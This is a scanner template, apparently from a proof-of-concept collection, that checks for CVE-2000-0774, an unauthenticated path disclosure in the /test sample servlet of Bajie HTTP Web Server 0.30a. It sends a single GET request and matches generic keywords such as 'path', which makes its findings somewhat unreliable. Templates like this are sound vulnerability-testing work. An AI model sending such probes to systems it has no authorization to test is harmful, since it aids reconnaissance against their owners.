[info]
author = "ave"
description = 'Bajie HTTP Web Server 0.30a 的示例 Java Servlet "test" 存在绝对路径泄露漏洞。攻击者发送 HTTP GET 请求访问 /test 路径，服务器将 Web 文档根目录的真实物理路径以明文形式返回至响应体中，无需任何身份认证即可触发。'
id = "POC-AVE-2000-0927"
name = "CVE-2000-0774 PoC"
severity = "medium"
tags = ["ave-2000-0927"]
vuln_id = [
    "CVE-2000-0774",
    "AVE-2000-0927",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/test"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "document root",
    "web root",
    "server root",
    "path",
    "dirname",
    "basedir",
]
